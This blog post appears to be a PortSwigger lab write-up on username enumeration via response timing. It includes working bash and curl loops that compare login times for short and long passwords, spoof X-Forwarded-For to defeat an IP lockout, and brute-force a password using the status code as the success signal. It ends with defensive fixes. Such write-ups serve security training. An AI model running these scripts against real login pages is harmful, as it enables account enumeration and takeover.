---
layout: post
title: "PortSwigger: Username Enumeration via Response Timing"
date: 2027-10-08 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, Authentication]
tags: [portswigger, authentication, username-enumeration, timing-attack, brute-force, login, cwe-208]
---

The last two username-enumeration labs leaked the answer in the *content* of the response — a different error message, or the same message off by one byte. This one leaks nothing you can read. The only difference between a valid and an invalid username is **how long the server takes to answer**. It's a textbook timing side channel ([CWE-208](https://cwe.mitre.org/data/definitions/208.html), Observable Timing Discrepancy), and it comes with a bonus IP-based lockout you have to defeat first.

## Overview

A login does two jobs: find the username, then verify the password. The password check is the slow part — apps deliberately run it through an expensive hash like bcrypt. This app only bothers running that hash **when the username actually exists**. So:

- **Invalid username** → bail out early → fast, constant response.
- **Valid username** → run the slow hash on whatever password you sent → slower, *and the time grows with the password's length*.

That length-dependence is the lever. Send a very long password and a valid account takes visibly longer than an invalid one.

There's also brute-force protection that blocks your IP after too many attempts — but it reads your IP from the `X-Forwarded-For` header, which you control. A fresh value per request and the lockout never fires.

## Why the obvious approach fails

My first instinct was: time one request per username, sort, pick the slowest. That doesn't work. Network jitter between you and the lab is *bigger* than the hash time, so a username that happens to be on a slow route looks exactly like a real account. On my first pass the slowest candidate was a dead end.

## The fix: measure a differential

Instead of one timing per username, take **two** — a short password and a long one — and look at the difference:

- Invalid user: both fast → difference ≈ 0.
- Valid user: short fast, long slow → big positive difference.

The subtraction cancels out whatever route latency that particular username had. Only the real account survives.

```bash
for u in $(cat usernames.txt); do
  s=$(curl -sk -o /dev/null -w '%{time_total}' \
      -H "X-Forwarded-For: 10.0.$((RANDOM%255)).$((RANDOM%255))" \
      "https://TARGET/login" --data-urlencode "username=$u" --data-urlencode 'password=aaa')
  l=$(curl -sk -o /dev/null -w '%{time_total}' \
      -H "X-Forwarded-For: 10.1.$((RANDOM%255)).$((RANDOM%255))" \
      "https://TARGET/login" --data-urlencode "username=$u" \
      --data-urlencode "password=$(printf 'a%.0s' {1..200})")
  awk -v a=$l -v b=$s -v u=$u 'BEGIN{printf "%+.3f %s\n", a-b, u}'
done | sort -rn | head
```

The result is unambiguous:

```
delta  short  long   user
+0.947 0.448 1.396 at      <-- valid
+0.199 0.475 0.674 auth
+0.177 0.437 0.613 affiliates
```

`at` is +0.95 seconds; everything else is under +0.2. That `X-Forwarded-For` header on every request is what kept the lockout from ever stopping the loop.

## Step 2 — brute the password

Now that we know the account, brute-force its password using the **HTTP status code** as the success oracle: a wrong password re-renders the form with `200`, a correct one issues a `302` redirect to `/my-account`.

```bash
for p in $(cat passwords.txt); do
  c=$(curl -sk -o /dev/null -w '%{http_code}' "https://TARGET/login" \
      --data-urlencode 'username=at' --data-urlencode "password=$p")
  [ "$c" = '302' ] && { echo "PASS FOUND: $p"; break; }
done
# -> PASS FOUND: george
```

> **Gotcha worth remembering:** if you write this in Python with `urllib` or `requests`, the library *silently follows* the success `302` to the `200` account page — so your script never sees the `302` and reports "not found" for the right password. Either disable redirect-following, or use the `curl -w '%{http_code}'` form above, which reports the raw status.

## Step 3 — log in

```
POST /login   username=at&password=george
HTTP/2 302    location: /my-account?id=at
```

Log in with the recovered session and the lab flips to **Solved**.

## Why it worked

The amount of work the server did betrayed a secret. The username lookup was cheap and the password hash was expensive, and the code only paid the expensive cost for real accounts. Anything an attacker can *measure* — bytes, status codes, or wall-clock time — is an information channel, even when the visible response is identical.

## The fix

- **Constant-time authentication:** run the password hash (or an equivalent dummy) even when the username doesn't exist, so valid and invalid logins take the same time regardless of input.
- **Trustworthy rate limiting:** throttle on the account/session and a network identity you actually control — never on a client-supplied header like `X-Forwarded-For`.
- **Generic responses across every axis:** same message, status, length, *and* timing for all failures.
- **Strong passwords:** `george` sits in the top-100 list; a long random password makes the second stage hopeless.
